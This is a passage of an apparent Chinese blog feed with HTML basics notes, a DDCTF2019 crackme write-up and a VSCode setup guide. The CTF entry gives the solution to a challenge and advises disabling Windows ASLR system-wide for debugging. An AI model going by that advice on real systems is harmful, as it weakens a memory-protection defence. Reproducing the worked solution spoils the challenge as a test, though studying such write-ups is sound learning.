lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;列表&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul style=&quot;list-style-type:circle&quot;&gt;        &lt;li&gt;无序列表1&lt;/li&gt;        &lt;li&gt;无序列表2&lt;/li&gt;        &lt;li&gt;无序列表3&lt;/li&gt;        &lt;li&gt;无序列表4&lt;/li&gt;    &lt;/ul&gt;    &lt;ol&gt;        &lt;li&gt;有序列表1&lt;/li&gt;        &lt;li&gt;有序列表2&lt;/li&gt;        &lt;li&gt;有序列表3&lt;/li&gt;        &lt;li&gt;有序列表4&lt;/li&gt;    &lt;/ol&gt;    &lt;dl&gt;        &lt;dt&gt;标题1&lt;/dt&gt;        &lt;dd&gt;自定义列表1&lt;/dd&gt;        &lt;dd&gt;自定义列表2&lt;/dd&gt;        &lt;dd&gt;自定义列表3&lt;/dd&gt;        &lt;dd&gt;自定义列表4&lt;/dd&gt;        &lt;dt&gt;标题2&lt;/dt&gt;        &lt;dd&gt;自定义列表1&lt;/dd&gt;        &lt;dd&gt;自定义列表2&lt;/dd&gt;        &lt;dd&gt;自定义列表3&lt;/dd&gt;        &lt;dd&gt;自定义列表4&lt;/dd&gt;    &lt;/dl&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/liebiao.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML表格"><a href="#HTML表格" class="headerlink" title="HTML表格"></a>HTML表格</h2><ul><li><p><strong>HTML 表格</strong>：表格由 <code>&lt;table&gt;</code>标签来定义。每个表格均有若干==行==（由 <code>&lt;tr&gt;</code> 标签定义），每行被分割为若干==单元格==（由 <code>&lt;td&gt;</code> 标签定义）。字母 td 指<strong>表格数据</strong>（table data），即数<strong>据单元格的内容</strong>。数据单元格可以包含<strong>文本、图片、列表、段落、表单、水平线、表格</strong>等等。这个有利于多样化，在分清栏目后在td里放内容就ok。</p></li><li><p><strong>HTML 边框属性</strong>:<code>&lt;table border=&quot;1&quot;&gt;</code>会出现表框。</p></li><li><p><strong>HTML 表格表头</strong>:表格的表头使用 <code>&lt;th&gt;</code> 标签进行定义。<code>&lt;th&gt;</code>标签与<code>&lt;td&gt;</code>标签<strong>用法相似只是显示的效果不同，会有粗体居中的效果；</strong></p></li><li><p><strong>HTML表格合并</strong>：用 <strong>colspan</strong>： 横向行  <strong>rowspan</strong>  ：竖纵行。</p></li><li><p><strong>HTML表格单元格边距的设置</strong>：类似 <strong>设置边框</strong> 直接在table标签里放入<strong>cellpadding=“自定义的数字”</strong>，就设置好了。</p></li></ul><p><strong>练习：</strong></p><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;表格&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;table border=&quot;1&quot;&gt;         &lt;tr&gt;           &lt;th&gt;部门&lt;/th&gt;           &lt;th&gt;姓名&lt;/th&gt;           &lt;th&gt;性别&lt;/th&gt;           &lt;th&gt;工资&lt;/th&gt;         &lt;/tr&gt;         &lt;tr&gt;             &lt;td rowspan=&quot;3&quot;&gt;开发组&lt;/td&gt;             &lt;td&gt;小明&lt;/td&gt;             &lt;td&gt;男&lt;/td&gt;             &lt;td&gt;1w&lt;/td&gt;         &lt;/tr&gt;         &lt;tr&gt;             &lt;td&gt;小白&lt;/td&gt;             &lt;td&gt;女&lt;/td&gt;             &lt;td&gt;1w&lt;/td&gt;         &lt;/tr&gt;         &lt;tr&gt;         &lt;td colspan=&quot;2&quot;&gt;工资合计&lt;/td&gt;         &lt;td&gt;2w&lt;/td&gt;         &lt;/tr&gt;    &lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>效果：</strong></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/biaoge.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-表单"><a href="#HTML-表单" class="headerlink" title="HTML 表单"></a>HTML 表单</h2><p>表单是一个包含<strong>表单元素</strong>的区域。表单元素是允许用户在表单中输入内容,比如：文本域(textarea)、下拉列表、单选框(radio-buttons)、复选框(checkboxes)等等。</p><p>`<form><br>input元素</form></p>\\\\\`<h4 id="HTML-表单-输入元素"><a href="#HTML-表单-输入元素" class="headerlink" title="HTML 表单 - 输入元素"></a>HTML 表单 - 输入元素</h4><p>输入标签<code>&lt;input&gt;</code>。</p><h4 id="文本域"><a href="#文本域" class="headerlink" title="文本域"></a>文本域</h4><p>文本域通过<code>&lt;input type=&quot;text&quot;&gt;</code> 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。</p><p>`<form><br>First name: <input type="text" name="firstname"><br><br>Last name: <input type="text" name="lastname"></form></p>\\\\\`<p><strong>在大多数浏览器中，文本域的缺省宽度是20个字符。</strong></p><h4 id="密码字段"><a href="#密码字段" class="headerlink" title="密码字段"></a>密码字段</h4><p><code>&lt;input type=&quot;password&quot;&gt;</code> 来定义</p><pre><code class="html">&lt;form&gt;Password: &lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/form&gt;</code></pre><h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h4><p><code>&lt;input type=&quot;radio&quot;&gt;</code> 标签定义了表单单选框选项。</p><pre><code class="html">&lt;form&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;&gt;Male&lt;br&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot;value=&quot;female&quot;&gt;Female&lt;/form&gt;</code></pre><p><strong>Name 是可以进行==分组==。想要有效果 value也少不了。</strong></p><h4 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h4><p><code>&lt;input type=&quot;checkbox&quot;&gt;</code>定义了复选框. 用户需要从若干给定的选择中选取一个或若干选项。</p><pre><code class="html">&lt;form&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Bike&quot;&gt;I have a bike&lt;br&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Car&quot;&gt;I have a car &lt;/form&gt;</code></pre><p><strong>类似单选三者缺一不可。</strong></p><h4 id="提交按钮"><a href="#提交按钮" class="headerlink" title="提交按钮"></a>提交按钮</h4><p><code>&lt;input type=&quot;submit&quot;&gt;</code>定义了提交按钮. </p><pre><code class="html">&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;&quot;&gt;Username: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;</code></pre><p>==value：提交数据到服务器的值（后台程序PHP使用）写按钮时一定要写上。   name：为控件命名，以备后台程序 ASP、PHP 使用==</p><h4 id="练习：-1"><a href="#练习：-1" class="headerlink" title="练习："></a>练习：</h4><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;表单&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;&quot;&gt; &lt;!-- action 中值为提交的网页 --&gt;&lt;!-- 默认为get --&gt;        admin&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;        password&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt;        &lt;input type=&quot;radio&quot; name=&quot;sex1&quot; value=&quot;male&quot;&gt;男 &lt;br&gt;        &lt;input type=&quot;radio&quot; name=&quot;sex1&quot; value=&quot;female&quot;&gt;女          &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;中性&lt;!-- name中值一样那么其分组就一样 --&gt;        &lt;!-- &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;男        &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;女        &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;中性 --&gt;        &lt;br&gt;        &lt;!-- 兴趣复选框 --&gt;        &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;kanshu&quot;&gt; 看书        &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;xuexi&quot;&gt;  学习        &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;music&quot;&gt;  听歌        &lt;br&gt;    城市&lt;select name=&quot;city&quot;&gt;            &lt;option value=&quot;shanghai&quot;&gt;上海&lt;/option&gt;            &lt;option value=&quot;beijing&quot;&gt;北京&lt;/option&gt;        &lt;/select&gt;        &lt;input type=&quot;submit&quot; name=&quot;&quot;&gt;&lt;br&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/biaodan.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML布局"><a href="#HTML布局" class="headerlink" title="HTML布局"></a>HTML布局</h2><p><strong>HTML 布局 - 使用<code>&lt;div&gt;</code> 元素.</strong></p><p>可以先分为头部div 底部div 和中间的div，然后逐步添加标签进行扩充，用<strong>css</strong>来设置样式。</p><p>这中间需要用到float：left等 来控制一个div中套用的div的位置。</p><ul><li>HTML中<code>&lt;div&gt;</code>元素是块级元素，它可用于组合其他 HTML元素的容器。</li><li><code>&lt;div&gt;</code> 元素的另一个常见的用途是文档布局。<code>&lt;div&gt;</code>元素经常与 <strong>CSS</strong> 一起使用，用来布局网页。</li><li><code>&lt;div&gt;</code> 元素没有特定的含义。</li></ul><p><strong>练习：</strong></p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;布局&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- &lt;div style=&quot;background: yellow; width: 50px;&quot;&gt;        这是个div这是个div这是个div这是个div    &lt;/div&gt; --&gt;    &lt;div style=&quot;background: yellow;height: 100px;&quot;&gt;导航&lt;/div&gt;    &lt;div style=&quot;background: green;width: 20%; float: left; height: 300px;&quot;&gt;菜单&lt;/div&gt;    &lt;di+v style=&quot;background: red;width: 80%; float: left;height: 300px;&quot;&gt;内容&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="HTML嵌套规则"><a href="#HTML嵌套规则" class="headerlink" title="HTML嵌套规则"></a>HTML嵌套规则</h2><h4 id="元素分类："><a href="#元素分类：" class="headerlink" title="元素分类："></a>元素分类：</h4><ul><li><strong>文字类块元素</strong>：p  h1~h6</li><li><strong>容器类块元素</strong>：div table tr td th form ul li ol dl dt dd</li><li><strong>行元素</strong>:不独立成行，不可以  内容决定a img input strong em del span</li><li><strong>特殊字符</strong>:br </li></ul><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4><ul><li>块元素可以嵌套行元素 <code>&lt;div&gt;这是div &lt;a href=&quot;&quot;&gt;这是a&lt;/a&gt; &lt;/div&gt;</code></li><li>行元素可以嵌套行元素 <code>&lt;a href=&quot;&quot;&gt;这是个&lt;strong〉 a&lt;/strong&gt;</code></li><li>行元素不可以嵌套块元素</li><li>文字类抉元素不可以嵌套块元素</li><li>容器类抉元素可以嵌套块元素</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;HTML-基础&quot;&gt;&lt;a href=&quot;#HTML-基础&quot; class=&quot;headerlink&quot; title=&quot;HTML 基础&quot;&gt;&lt;/a&gt;HTML 基础&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;HTML标题&lt;/strong&gt;：是通过 &lt;code&gt;&amp;lt;h1&amp;gt;
      
    
    </summary>
    
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2019-RE-Windows Reverse</title>
    <link href="http://chumen77.xyz/2019/11/17/DDCTF2019-RE-Windows%20Reverse/"/>
    <id>http://chumen77.xyz/2019/11/17/DDCTF2019-RE-Windows Reverse/</id>
    <published>2019-11-17T09:38:51.000Z</published>
    <updated>2020-02-28T07:52:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2019-RE-Windows-Reverse"><a href="#DDCTF2019-RE-Windows-Reverse" class="headerlink" title="DDCTF2019-RE-Windows Reverse"></a>DDCTF2019-RE-Windows Reverse</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在一个论坛里发现DDCTF这两道逆向题不是很难，就想着做一下练练手。因为最近做的都是比较老的题目，这个还算新一点的。题目下载：<br><a href="https://raw.githubusercontent.com/chumen77/chumen77.github.io/master/2019/11/17/DDCTF2019-RE-Windows Reverse/reverse1_final.zip" target="_blank">reverse1_final.zip</a><br><a href="https://raw.githubusercontent.com/chumen77/chumen77.github.io/master/2019/11/17/DDCTF2019-RE-Windows Reverse/reverse2_final.exe.zip" target="_blank">reverse2_final.exe.zip</a></p><h2 id="reverse1-final-exe"><a href="#reverse1-final-exe" class="headerlink" title="reverse1_final.exe"></a>reverse1_final.exe</h2><h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739838372961.jpg" srcset="/img/loading.gif" alt="-w539"><br>可以看出是UPX壳。<br>另外：</p><pre><code> /Volumes/data/ctf逆向题目/2019ddctf  file reverse1_final.exereverse1_final.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed</code></pre><p>在mac终端也可以用file命令查出。</p><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>直接在终端UPX -d 脱了就可以了。</p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>发现直接是运行不了的，想到是不是因为脱壳后这个需要资源修复，各种操作修复后发现还是不可以。最后查询他人wp发现这个程序开启了<strong>ASLR</strong>。需要pe工具去关闭这个程序的ASLR。然后我就去查了ASLR是怎么关闭的，且其是什么东西。</p><h4 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h4><p>ASLR通过随机放置进程关键数据区域的地址空间来防止攻击者能可靠地跳转到内存的特定位置来利用函数。现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行Return-to-libc攻击。 –百度百科<br>随后又查询到win7以后的windows系统都是有这个机制的，<strong>但因为有它的存在每次od载入时，其映像基址都是会变化的，而你有时候需要计算一些地址，基址老是变</strong>。以前我是不知道这个的，知道以后感觉这个是更加利于对程序的分析，就想着直接关闭windows7的ASLR。</p><h4 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h4><p>有两种办法。</p><h5 id="改注册表"><a href="#改注册表" class="headerlink" title="改注册表"></a>改注册表</h5><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739848952944.jpg" srcset="/img/loading.gif" alt="-w901"><br>注册表添加了一个DWORD键值项，其值为0。注意其名称和路径。</p><h5 id="软件关闭"><a href="#软件关闭" class="headerlink" title="软件关闭"></a>软件关闭</h5><p>下载EMET：<a href="https://www.updatestar.com/directdownload/emet/2258274" target="_blank" rel="noopener">https://www.updatestar.com/directdownload/emet/2258274</a><br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739850550859.jpg" srcset="/img/loading.gif" alt="-w730"><br>关闭后重启即可。</p><h4 id="成功运行"><a href="#成功运行" class="headerlink" title="成功运行"></a>成功运行</h4><p>程序成功运行后发现：<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739851761277.jpg" srcset="/img/loading.gif" alt="-w499"><br>这个估计又是字符对比。用IDA打开分析其逻辑。</p><h3 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h4><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [esp+4h] [ebp-804h]  char v5; // [esp+5h] [ebp-803h]  char v6; // [esp+404h] [ebp-404h]  char Dst; // [esp+405h] [ebp-403h]  v6 = 0;  memset(&amp;Dst, 0, 0x3FFu);  v4 = 0;  memset(&amp;v5, 0, 0x3FFu);  printf(&quot;please input code:&quot;);  scanf(&quot;%s&quot;, &amp;v6);  sub_401000(&amp;v6);  if ( !strcmp(&amp;v4, &quot;DDCTF{reverseME}&quot;) )    printf(&quot;You&#39;ve got it!!%s\n&quot;, &amp;v4);  else    printf(&quot;Try again later.\n&quot;);  return 0;}</code></pre><p>代码很简单，可以看出来是在接受输入后，经过sub_401000函数分处理后与DDCTF{reverseME}对比，正确就输出You’ve got it!。</p><h4 id="处理函数sub-401000"><a href="#处理函数sub-401000" class="headerlink" title="处理函数sub_401000"></a>处理函数sub_401000</h4><pre><code>unsigned int __cdecl sub_401000(const char *a1){  _BYTE *v1; // ecx  unsigned int i; // edi  unsigned int result; // eax  const char *v4; // ebx  i = 0;  result = strlen(a1);  if ( result )  {    v4 = (a1 - v1);    do    {      *v1 = byte_402FF8[v1[v4]];      ++i;      ++v1;      result = strlen(a1);    }    while ( i &lt; result );  }  return result;}</code></pre><p>可以看出来输入的东西的确在这里进行了，一位位的处理。<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739858421447.jpg" srcset="/img/loading.gif" alt="-w521"><br>用这里的字符串进行了替换。<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739858895484.jpg" srcset="/img/loading.gif" alt="-w917"><br>但是跳转查看发现没什么东西，发现最下方一段不知道有什么用的字符串。静态分析至此，没什么思路了。用od来看看我们输入的字符串会变成什么样。</p><h3 id="OD动态分析"><a href="#OD动态分析" class="headerlink" title="OD动态分析"></a>OD动态分析</h3><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739860730789.jpg" srcset="/img/loading.gif" alt="-w555"><br>定位在这个字符串之前应该就可以看到我们输入后被处理后的字符串。<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739861642584.jpg" srcset="/img/loading.gif" alt="-w1006"><br>在前面一个函数进行下断点，也可以清楚看到他就是我们刚刚说的加密函数<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739862054229.jpg" srcset="/img/loading.gif" alt="-w334"><br>这就是一个地址。然后我们输入123测试<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739862667897.jpg" srcset="/img/loading.gif" alt="-w361"><br>已经穿进eax。<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739863094523.jpg" srcset="/img/loading.gif" alt="-w1199"><br>直接F8不进入函数内部，因为我们的目的就看怎么处理了我们输入的字符串。发现变成了<code>mlk</code>。<br>查看下对应的ASCIL:<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739864384097.jpg" srcset="/img/loading.gif" alt="-w544"><br><strong>可以明显发现处理前的字符与处理后的字符相加都等于158</strong>。</p><h3 id="脚本解密"><a href="#脚本解密" class="headerlink" title="脚本解密"></a>脚本解密</h3><pre><code>#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() {    char arr[]=&quot;DDCTF{reverseME}&quot;;    for (int i = 0; i &lt; strlen(arr); i++)    {        arr[i]=158-arr[i];    }    printf(&quot;%s&quot;,arr);    }</code></pre><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739865575323.jpg" srcset="/img/loading.gif" alt="-w250"><br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739865898152.jpg" srcset="/img/loading.gif" alt="-w437"><br><strong>%是VC编译的字符串结束标志不用代入。</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在某在题目中，静态分析加密函数有些困难的时候，往往没有动态分析来的快，感觉动静结合分析是很好的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF2019-RE-Windows-Reverse&quot;&gt;&lt;a href=&quot;#DDCTF2019-RE-Windows-Reverse&quot; class=&quot;headerlink&quot; title=&quot;DDCTF2019-RE-Windows Reverse&quot;&gt;&lt;/a&gt;DD
      
    
    </summary>
    
    
      <category term="Re" scheme="http://chumen77.xyz/tags/Re/"/>
    
  </entry>
  
  <entry>
    <title>Vscode的简单调教</title>
    <link href="http://chumen77.xyz/2019/11/15/Vs%20code%E7%9A%84%E7%AE%80%E5%8D%95%E8%B0%83%E6%95%99/"/>
    <id>http://chumen77.xyz/2019/11/15/Vs code的简单调教/</id>
    <published>2019-11-15T02:55:26.000Z</published>
    <updated>2020-02-28T07:53:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vscode的简单调教"><a href="#Vscode的简单调教" class="headerlink" title="Vscode的简单调教"></a>Vscode的简单调教</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>VScode是比较适合自己使用的，因为非常的简洁且不臃肿，拓展性还好。并且自己常写代码是就是为了输入输出实现某些功能，基本用不到调试功能。但碍于难以配置各种环境，一直没有用上，失败了很多次。现在又学着整了一下，现在已经吃上了vscode的香。写个博客，记录一下，也可以分析下经验。</p><h2 id="正常设置"><a href="#正常设置" class="headerlink" title="正常设置"></a>正常设置</h2><p><img src="/2019/11/15/Vs code的简单调教/images/15737872236921.jpg" srcset="/img/loading.gif" alt="-w143"></p><p>在这里点击完设置以后，会出现：<br><img src="/2019/11/15/Vs code的简单调教/images/15737872693861.jpg" srcset="/img/loading.gif" alt="-w791"><br>在这里可以设置vscode的各种地方，就如图中一样，需要自己探索一下，然后设置成自己想要的结果。</p><h2 id="配置编译环境"><a href="#配置编译环境" class="headerlink" title="配置编译环境"></a>配置编译环境</h2><p>这里我只用到c/c++和Python就只记录这个了。<br><img src="/2019/11/15/Vs code的简单调教/images/15737878495576.jpg" srcset="/img/loading.gif" alt="-w449"><br>输入C/C++<br><img src="/2019/11/15/Vs code的简单调教/images/15737879247492.jpg" srcset="/img/loading.gif" alt="-w676"><br>在这里进行点个install。<br>PYthon也是同样的操作。</p><h2 id="让代码跑起来"><a href="#让代码跑起来" class="headerlink" title="让代码跑起来"></a>让代码跑起来</h2><p>在应用商店里搜索<strong>Code Runner</strong>。<br><img src="/2019/11/15/Vs code的简单调教/images/15737881342794.jpg" srcset="/img/loading.gif" alt="-w653"><br>这个是个神器，有了它就可以在vscode直接运行各种代码。<br>安装好后把vscode关闭，然后重新打开。</p><h3 id="新建个C-C-文件："><a href="#新建个C-C-文件：" class="headerlink" title="新建个C/C++文件："></a>新建个C/C++文件：</h3><p><img src="/2019/11/15/Vs code的简单调教/images/15737885382202.jpg" srcset="/img/loading.gif" alt="-w677"><br>然后右键<br><img src="/2019/11/15/Vs code的简单调教/images/15737886009237.jpg" srcset="/img/loading.gif" alt="-w287"><br>是可以运行代码的。<br>在右上角：<br><img src="/2019/11/15/Vs code的简单调教/images/15737886490345.jpg" srcset="/img/loading.gif" alt="-w305"><br>这个小三角也可以运行代码。看下效果：<br><img src="/2019/11/15/Vs code的简单调教/images/15737886695093.jpg" srcset="/img/loading.gif" alt="-w1007"></p><h3 id="更改为终端输出"><a href="#更改为终端输出" class="headerlink" title="更改为终端输出"></a>更改为终端输出</h3><p>我们改一下代码：<br>    #include <iostream><br><br>    int main() {<br>        int a;<br>        scanf(“%d”,&amp;a);<br>        printf(“hello world!”);<br><br>    }</iostream></p><p>在这样直接运行后发现：<img src="/2019/11/15/Vs code的简单调教/images/15737890616864.jpg" srcset="/img/loading.gif" alt="-w1070"><br>卡在运行过程且我们无法输入：<br><img src="/2019/11/15/Vs code的简单调教/images/15737891086923.jpg" srcset="/img/loading.gif" alt="-w290"><br>这个解决办法就是<strong>更改为终端输出就可以了</strong>。<br><img src="/2019/11/15/Vs code的简单调教/images/15737891942172.jpg" srcset="/img/loading.gif" alt="-w479"><br>点击配置扩展信息。下滑找到：<br><img src="/2019/11/15/Vs code的简单调教/images/15737893476953.jpg" srcset="/img/loading.gif" alt="-w559"><br>然后打个勾就可以了。<br>运行：<br><img src="/2019/11/15/Vs code的简单调教/images/15737894451238.jpg" srcset="/img/loading.gif" alt="-w677"><br>发现成功了，然后看下其原理就是帮你对终端进行了<br><code>cd &quot;/Volumes/data/c:c++/&quot; &amp;&amp; g++ test.cpp -o test &amp;&amp; &quot;/Volumes/data/c:c++/&quot;test</code>这个命令的执行，发现其是用gcc进行了编译，mac是自带clang的，clang的优点挺多的，<strong>且支持语法错误的检测，</strong>然后就想着去改下让其用clang++来编译。</p><h3 id="自定义运行逻辑"><a href="#自定义运行逻辑" class="headerlink" title="自定义运行逻辑"></a>自定义运行逻辑</h3><p><img src="/2019/11/15/Vs code的简单调教/images/15737891942172.jpg" srcset="/img/loading.gif" alt="-w479"><br>还是进入这个配置里面：<br><img src="/2019/11/15/Vs code的简单调教/images/15737897368419.jpg" srcset="/img/loading.gif" alt="-w411"><br>在settings.json中编辑:</p><pre><code>&quot;code-runner.executorMap&quot; : {       &quot;java&quot;: &quot;cd $dir &amp;&amp; javac $fileName &amp;&amp; java $fileNameWithoutExt&quot;,       &quot;c&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;cpp&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;objective-c&quot;: &quot;cd $dir &amp;&amp; clang++ -framework Cocoa $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;php&quot;: &quot;php&quot;,       &quot;python&quot;: &quot;python -u&quot;,       &quot;ruby&quot;: &quot;ruby&quot;,   }</code></pre><h4 id="成品："><a href="#成品：" class="headerlink" title="成品："></a>成品：</h4><p><img src="/2019/11/15/Vs code的简单调教/images/15737900505196.jpg" srcset="/img/loading.gif" alt="-w1110"><br>直接粘贴这段代码放入这里面保存就可以了。</p><h4 id="效果："><a href="#效果：" class="headerlink" title="效果："></a>效果：</h4><p><img src="/2019/11/15/Vs code的简单调教/images/15737901558381.jpg" srcset="/img/loading.gif" alt="-w860"><br>实现我们的目的了。</p><h3 id="测试一下Python"><a href="#测试一下Python" class="headerlink" title="测试一下Python"></a>测试一下Python</h3><p>这是直接新建的：<br><img src="/2019/11/15/Vs code的简单调教/images/15737904131858.jpg" srcset="/img/loading.gif" alt="-w430"><br><img src="/2019/11/15/Vs code的简单调教/images/15737904322136.jpg" srcset="/img/loading.gif" alt="-w465"><br>这样就可以一个vscode运行各种代码，对于不是专门做开发，只是写脚本的，就是个福音。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Vscode的简单调教&quot;&gt;&lt;a href=&quot;#Vscode的简单调教&quot; class=&quot;headerlink&quot; title=&quot;Vscode的简单调教&quot;&gt;&lt;/a&gt;Vscode的简单调教&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="vscode" scheme="http://chumen77.xyz/tags/vscode/"/>
    
  </entry>
  
</feed>
